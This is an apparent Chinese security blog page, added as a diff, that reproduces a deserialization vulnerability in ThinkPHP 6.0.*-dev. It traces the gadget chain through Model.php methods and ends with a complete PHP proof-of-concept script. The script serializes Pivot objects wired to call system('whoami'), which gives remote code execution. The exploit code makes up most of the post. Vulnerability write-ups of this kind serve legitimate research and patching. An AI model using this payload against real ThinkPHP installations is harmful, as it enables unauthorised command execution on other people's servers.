@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Thinkphp 6.0.*-dev 反序列化漏洞一、漏洞简介所有Thinkphp版本下载链接 https:&#x2F;&#x2F;packagist.org&#x2F;packages&#x2F;topthink&#x2F;framework 二、漏洞影响三、复现过程环境搭建composer create-project topthink&#x2F;think&#x3D;6.0.*-dev v6.0  poc演示截图">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%206.0._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Thinkphp 6.0.*-dev 反序列化漏洞一、漏洞简介所有Thinkphp版本下载链接 https:&#x2F;&#x2F;packagist.org&#x2F;packages&#x2F;topthink&#x2F;framework 二、漏洞影响三、复现过程环境搭建composer create-project topthink&#x2F;think&#x3D;6.0.*-dev v6.0  poc演示截图">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp6.0.*-dev%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp6.0.*-dev%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp6.0.*-dev%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId31.png">
+<meta property="article:published_time" content="2022-07-08T06:26:05.367Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.403Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Thinkphp6.0.*-dev%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 6.0._-dev 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%206.0._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.367Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-6-0-dev-反序列化漏洞"><a href="#Thinkphp-6-0-dev-反序列化漏洞" class="headerlink" title="Thinkphp 6.0.*-dev 反序列化漏洞"></a>Thinkphp 6.0.*-dev 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>所有Thinkphp版本下载链接</p>
+<p><a target="_blank" rel="noopener" href="https://packagist.org/packages/topthink/framework">https://packagist.org/packages/topthink/framework</a></p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre><code>composer create-project topthink/think=6.0.*-dev v6.0
+</code></pre>
+<h3 id="poc演示截图"><a href="#poc演示截图" class="headerlink" title="poc演示截图"></a>poc演示截图</h3><p><img src="/resource/Thinkphp6.0.*-dev%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p><img src="/resource/Thinkphp6.0.*-dev%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<h3 id="单步调试"><a href="#单步调试" class="headerlink" title="单步调试"></a>单步调试</h3><pre><code>//vendor\topthink\think-orm\src\Model.php
+public function __destruct()
+&#123;
+    if ($this-&gt;lazySave) &#123;  //$this-&gt;lazySave可控
+        $this-&gt;save();
+    &#125;
+&#125;
+//vendor\topthink\think-orm\src\Model.php
+public function save(array $data = [], string $sequence = null): bool
+&#123;
+    // 数据对象赋值
+    $this-&gt;setAttrs($data);
+
+    if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#39;BeforeWrite&#39;)) &#123;
+       return false;
+    &#125;
+
+    $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); //this-&gt;exists可控
+
+    if (false === $result) &#123;
+       return false;
+    &#125;
+//vendor\topthink\think-orm\src\Model.php
+public function isEmpty(): bool
+&#123;
+    return empty($this-&gt;data);    //可控
+&#125;
+protected function trigger(string $event): bool
+&#123;
+    if (!$this-&gt;withEvent) &#123;       //可控
+        return true;
+    &#125;
+    ...
+&#125;
+protected function updateData(): bool
+&#123;
+    // 事件回调
+    if (false === $this-&gt;trigger(&#39;BeforeUpdate&#39;)) &#123;   //可控
+       return false;
+    &#125;
+
+    $this-&gt;checkData();
+
+    // 获取有更新的数据
+    $data = $this-&gt;getChangedData();  
+
+    if (empty($data)) &#123;         //$data可控
+       // 关联更新
+       if (!empty($this-&gt;relationWrite)) &#123;
+         $this-&gt;autoRelationUpdate();
+       &#125;
+
+       return true;
+    &#125;
+
+    if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime])) &#123;
+       // 自动写入更新时间
+       $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp($this-&gt;updateTime);
+       $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];
+    &#125;
+
+    // 检查允许字段
+    $allowFields = $this-&gt;checkAllowFields();
+public function getChangedData(): array
+&#123;
+    $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) &#123;
+       if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) &#123;
+         return 1;
+       &#125;
+    //$this-&gt;force可控
+       return is_object($a) || $a != $b ? 1 : 0;
+    &#125;);
+
+    // 只读字段不允许更新
+    foreach ($this-&gt;readonly as $key =&gt; $field) &#123;
+       if (isset($data[$field])) &#123;
+         unset($data[$field]);
+       &#125;
+    &#125;
+
+    return $data;
+&#125;
+protected function checkAllowFields(): array
+&#123;
+    // 检测字段
+    if (empty($this-&gt;field)) &#123;   //$this-&gt;field可控
+       if (!empty($this-&gt;schema)) &#123;  //$this-&gt;schema可控
+         $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType));
+       &#125; else &#123;
+         $query = $this-&gt;db();
+         $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable();
+public function db($scope = []): Query
+&#123;
+    /** @var Query $query */
+    $query = self::$db-&gt;connect($this-&gt;connection)   //$this-&gt;connection可控
+       -&gt;name($this-&gt;name . $this-&gt;suffix)   //$this-&gt;suffix可控，采用拼接，调用_toString
+       -&gt;pk($this-&gt;pk);
+</code></pre>
+<p>后面的链跟之前的一样，这里就不分析了</p>
+<p><img src="/resource/Thinkphp6.0.*-dev%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
+<h3 id="poc-v6-0-dev"><a href="#poc-v6-0-dev" class="headerlink" title="poc v6.0.*-dev"></a>poc v6.0.*-dev</h3><pre><code>&lt;?php
+/**
+ * Created by PhpStorm.
+ * User: wh1t3P1g
+ */
+
+namespace think\model\concern &#123;
+    trait Conversion&#123;
+        protected $visible;
+    &#125;
+    trait RelationShip&#123;
+        private $relation;
+    &#125;
+    trait Attribute&#123;
+        private $withAttr;
+        private $data;
+        protected $type;
+    &#125;
+    trait ModelEvent&#123;
+        protected $withEvent;
+    &#125;
+&#125;
+
+namespace think &#123;
+    abstract class Model&#123;
+        use model\concern\RelationShip;
+        use model\concern\Conversion;
+        use model\concern\Attribute;
+        use model\concern\ModelEvent;
+        private $lazySave;
+        private $exists;
+        private $force;
+        protected $connection;
+        protected $suffix;
+        function __construct($obj)
+        &#123;
+            if($obj == null)&#123;
+                $this-&gt;data = array(&quot;wh1t3p1g&quot;=&gt;&quot;whoami&quot;);
+                $this-&gt;relation = array(&quot;wh1t3p1g&quot;=&gt;[]);
+                $this-&gt;visible= array(&quot;wh1t3p1g&quot;=&gt;[]);
+                $this-&gt;withAttr = array(&quot;wh1t3p1g&quot;=&gt;&quot;system&quot;);
+            &#125;else&#123;
+                $this-&gt;lazySave = true;
+                $this-&gt;withEvent = false;
+                $this-&gt;exists = true;
+                $this-&gt;force = true;
+                $this-&gt;data = array(&quot;wh1t3p1g&quot;=&gt;[]);
+                $this-&gt;connection = &quot;mysql&quot;;
+                $this-&gt;suffix = $obj;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+
+
+namespace think\model &#123;
+    class Pivot extends \think\Model&#123;
+        function __construct($obj)
+        &#123;
+            parent::__construct($obj);
+        &#125;
+    &#125;
+&#125;
+
+
+namespace &#123;
+    $pivot1 = new \think\model\Pivot(null);
+    $pivot2 = new \think\model\Pivot($pivot1);
+    echo base64_encode(serialize($pivot2));
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%206.0._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwwn00j0y8v117600927" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Thinkphp%20shop/Thinkphp%20Shop%20%E4%BE%9B%E5%BA%94%E5%95%86%E5%90%8E%E5%8F%B0%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.2._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
